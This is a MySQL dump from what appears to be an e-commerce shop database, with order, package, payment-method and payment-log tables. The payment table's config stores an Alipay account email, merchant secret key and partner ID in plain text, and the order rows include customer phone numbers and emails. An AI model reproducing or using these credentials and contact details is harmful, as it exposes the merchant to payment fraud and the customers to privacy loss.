INSERT INTO `ec22703249_order_info` VALUES ('8', '2014081335708', '16', '1', '0', '2', '测试', '0', '0', '0', '0', '', '', '13052083496', '', 'shoptest@126.com', '', '', '', '-1', '', '4', '余额支付', '等待所有商品备齐后再发', '', '', '', '', '', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0', '0.00', '0.00', '0.00', '0', '本站', '1407898061', '1407898061', '1407898061', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');
INSERT INTO `ec22703249_order_info` VALUES ('9', '2014081433105', '17', '1', '0', '2', 'hello22', '0', '0', '0', '0', '', '', '13222323232', '13222323232', '1111111@qq.com', '', '', '', '-1', '', '3', '银行汇款/转帐', '等待所有商品备齐后再发', '', '', '', '', '', '', '0.00', '0.00', '0.00', '10.00', '0.00', '0.00', '10.00', '0.00', '0', '0.00', '0.00', '0.00', '0', '本站', '1407978098', '1407978127', '1407978127', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');
INSERT INTO `ec22703249_order_info` VALUES ('11', '2014081654691', '17', '5', '5', '2', '李大钊', '1', '2', '52', '501', 'CVMNMM,1', '2001123', '', '13685634255', '324234@qq.com', '周六下午', '', '', '2', '申通快递', '4', '余额支付', '', '', '', '', '', '', '', '49.00', '0.00', '0.00', '0.00', '0.00', '0.00', '154.50', '0.00', '0', '0.00', '0.00', '154.50', '0', '用户套餐自动生成', '1408180153', '1408180153', '1408180153', '1408180153', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '-105.50');
INSERT INTO `ec22703249_order_info` VALUES ('12', '2014081888511', '17', '1', '0', '2', 'hello22', '1', '6', '79', '717', '12313', '234234', '13222323232', '13222323232', '1111111@qq.com', '', '', '', '-1', '', '4', '余额支付', '等待所有商品备齐后再发', '', '', '', '', '', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0', '0.00', '0.00', '0.00', '0', '本站', '1408328622', '1408328622', '1408328622', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');

-- ----------------------------
-- Table structure for `ec22703249_pack`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_pack`;
CREATE TABLE `ec22703249_pack` (
  `pack_id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `pack_name` varchar(120) NOT NULL DEFAULT '',
  `pack_img` varchar(255) NOT NULL DEFAULT '',
  `pack_fee` decimal(6,2) unsigned NOT NULL DEFAULT '0.00',
  `free_money` smallint(5) unsigned NOT NULL DEFAULT '0',
  `pack_desc` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`pack_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_pack
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_package_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_package_goods`;
CREATE TABLE `ec22703249_package_goods` (
  `package_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `product_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_number` smallint(5) unsigned NOT NULL DEFAULT '1',
  `admin_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`package_id`,`goods_id`,`admin_id`,`product_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_package_goods
-- ----------------------------
INSERT INTO `ec22703249_package_goods` VALUES ('4', '1', '0', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('4', '2', '0', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('4', '6', '0', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('4', '9', '0', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('4', '21', '0', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('4', '11', '0', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('5', '1', '0', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('5', '2', '0', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('5', '6', '0', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('5', '10', '1', '1', '1');
INSERT INTO `ec22703249_package_goods` VALUES ('5', '4', '0', '1', '1');

-- ----------------------------
-- Table structure for `ec22703249_payment`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_payment`;
CREATE TABLE `ec22703249_payment` (
  `pay_id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `pay_code` varchar(20) NOT NULL DEFAULT '',
  `pay_name` varchar(120) NOT NULL DEFAULT '',
  `pay_fee` varchar(10) NOT NULL DEFAULT '0',
  `pay_desc` text NOT NULL,
  `pay_order` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `pay_config` text NOT NULL,
  `enabled` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_cod` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_online` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`pay_id`),
  UNIQUE KEY `pay_code` (`pay_code`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_payment
-- ----------------------------
INSERT INTO `ec22703249_payment` VALUES ('1', 'alipay', '支付宝', '0', '支付宝网站(www.alipay.com) 是国内先进的网上支付平台。<br/>支付宝收款接口：在线即可开通，<font color=\"red\"><b>零预付，免年费</b></font>，单笔阶梯费率，无流量限制。<br/><a href=\"http://cloud.ecshop.com/payment_apply.php?mod=alipay\" target=\"_blank\"><font color=\"red\">立即在线申请</font></a>', '0', 'a:4:{i:0;a:3:{s:4:\"name\";s:14:\"alipay_account\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:12:\"sclzz@qq.com\";}i:1;a:3:{s:4:\"name\";s:10:\"alipay_key\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:32:\"le5fni3jhgd9lojrfsbrre5j096wxyzv\";}i:2;a:3:{s:4:\"name\";s:14:\"alipay_partner\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:16:\"2088411340051371\";}i:3;a:3:{s:4:\"name\";s:17:\"alipay_pay_method\";s:4:\"type\";s:6:\"select\";s:5:\"value\";s:1:\"2\";}}', '0', '0', '1');
INSERT INTO `ec22703249_payment` VALUES ('2', 'cod', '货到付款', '0', '开通城市：×××\r\n货到付款区域：×××', '0', 'a:0:{}', '1', '1', '0');
INSERT INTO `ec22703249_payment` VALUES ('3', 'bank', '银行汇款/转帐', '10', '银行名称\r\n收款人信息：全称 ××× ；帐号或地址 ××× ；开户行 ×××。\r\n注意事项：办理电汇时，请在电汇单“汇款用途”一栏处注明您的订单号。', '0', 'a:0:{}', '1', '0', '0');
INSERT INTO `ec22703249_payment` VALUES ('4', 'balance', '余额支付', '0', '使用帐户余额支付。只有会员才能使用，通过设置信用额度，可以透支。', '0', 'a:0:{}', '1', '0', '1');

-- ----------------------------
-- Table structure for `ec22703249_pay_log`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_pay_log`;
CREATE TABLE `ec22703249_pay_log` (
  `log_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `order_amount` decimal(10,2) unsigned NOT NULL,
  `order_type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_paid` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`log_id`)
) ENGINE=MyISAM AUTO_INCREMENT=299 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_pay_log
-- ----------------------------
INSERT INTO `ec22703249_pay_log` VALUES ('1', '1', '74.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('2', '2', '699.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('3', '3', '1299.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('4', '4', '99.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('5', '6', '33.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('6', '7', '40.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('7', '8', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('8', '10', '714.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('9', '12', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('10', '13', '699.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('11', '14', '699.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('12', '15', '714.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('13', '16', '714.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('14', '17', '1999.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('15', '18', '1999.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('16', '23', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('17', '26', '84.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('18', '27', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('19', '28', '191.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('20', '30', '733.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('21', '31', '99.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('22', '32', '252.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('23', '34', '1398.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('24', '35', '2613.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('25', '36', '59.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('26', '37', '64.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('27', '38', '64.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('28', '39', '18.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('29', '40', '1398.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('30', '41', '264.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('31', '42', '28.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('32', '43', '49.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('33', '44', '699.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('34', '45', '176.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('35', '47', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('36', '49', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('37', '50', '699.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('38', '51', '714.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('39', '52', '34.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('40', '54', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('41', '56', '4142.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('42', '57', '49.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('43', '58', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('44', '63', '33.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('45', '65', '714.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('46', '67', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('47', '68', '699.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('48', '69', '18.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('49', '70', '19.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('50', '71', '74.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('51', '72', '2172.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('52', '73', '34.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('53', '74', '1314.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('54', '76', '176.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('55', '77', '1999.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('56', '78', '1314.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('57', '79', '3998.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('58', '80', '1314.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('59', '81', '28.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('60', '1', '12.00', '1', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('61', '82', '724.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('62', '83', '43.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('63', '84', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('64', '86', '88.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('65', '87', '709.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('66', '90', '18.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('67', '91', '74.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('68', '92', '74.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('69', '93', '28.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('70', '94', '1999.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('71', '95', '128.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('72', '96', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('73', '99', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('74', '100', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('75', '101', '1415.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('76', '102', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('77', '103', '142.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('78', '104', '771.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('79', '105', '2714.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('80', '106', '1999.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('81', '107', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('82', '108', '28.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('83', '109', '43.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('84', '110', '0.50', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('85', '111', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('86', '112', '88.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('87', '113', '88.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('88', '114', '299.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('89', '115', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('90', '116', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('91', '117', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('92', '118', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('93', '119', '217.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('94', '120', '0.50', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('95', '121', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('96', '124', '88.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('97', '125', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('98', '126', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('99', '127', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('100', '128', '0.50', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('101', '130', '99.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('102', '130', '99.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('103', '131', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('104', '133', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('105', '135', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('106', '136', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('107', '139', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('108', '140', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('109', '141', '43.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('110', '142', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('111', '143', '1613.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('112', '144', '43.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('113', '145', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('114', '146', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('115', '147', '1400.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('116', '148', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('117', '149', '74.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('118', '150', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('119', '151', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('120', '2', '11.00', '1', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('121', '3', '100.00', '1', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('122', '155', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('123', '156', '0.02', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('124', '157', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('125', '158', '1314.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('126', '160', '55.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('127', '161', '43.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('128', '162', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('129', '163', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('130', '164', '1299.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('131', '165', '1299.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('132', '166', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('133', '167', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('134', '168', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('135', '169', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('136', '170', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('137', '171', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('138', '172', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('139', '173', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('140', '174', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('141', '177', '34.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('142', '178', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('143', '179', '28.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('144', '180', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('145', '181', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('146', '182', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('147', '183', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('148', '184', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('149', '186', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('150', '187', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('151', '188', '116.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('152', '189', '18.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('153', '190', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('154', '191', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('155', '192', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('156', '193', '64.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('157', '197', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('158', '198', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('159', '199', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('160', '200', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('161', '201', '71.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('162', '202', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('163', '203', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('164', '204', '0.02', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('165', '205', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('166', '206', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('167', '207', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('168', '208', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('169', '210', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('170', '211', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('171', '212', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('172', '213', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('173', '214', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('174', '215', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('175', '216', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('176', '217', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('177', '218', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('178', '219', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('179', '220', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('180', '221', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('181', '222', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('182', '223', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('183', '224', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('184', '225', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('185', '226', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('186', '227', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('187', '228', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('188', '231', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('189', '232', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('190', '233', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('191', '234', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('192', '235', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('193', '236', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('194', '237', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('195', '238', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('196', '239', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('197', '240', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('198', '242', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('199', '245', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('200', '246', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('201', '247', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('202', '248', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('203', '251', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('204', '252', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('205', '253', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('206', '254', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('207', '255', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('208', '256', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('209', '257', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('210', '258', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('211', '259', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('212', '260', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('213', '261', '0.02', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('214', '262', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('215', '263', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('216', '264', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('217', '265', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('218', '266', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('219', '267', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('220', '268', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('221', '269', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('222', '270', '0.03', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('223', '271', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('224', '273', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('225', '274', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('226', '275', '0.02', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('227', '279', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('228', '282', '10.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('229', '283', '10.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('230', '284', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('231', '285', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('232', '286', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('233', '288', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('234', '289', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('235', '290', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('236', '291', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('237', '292', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('238', '293', '19.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('239', '4', '1.00', '1', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('240', '5', '1.00', '1', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('241', '6', '11.00', '1', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('242', '295', '103.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('243', '296', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('244', '297', '53.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('245', '298', '43.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('246', '299', '34.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('247', '301', '1005.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('248', '302', '5221.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('249', '303', '114.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('250', '304', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('251', '305', '710.50', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('252', '306', '707.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('253', '307', '722.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('254', '308', '33.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('255', '309', '40.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('256', '310', '89.32', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('257', '311', '194.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('258', '312', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('259', '313', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('260', '314', '1415.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('261', '315', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('262', '316', '1398.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('263', '317', '715.00', '0', '0');
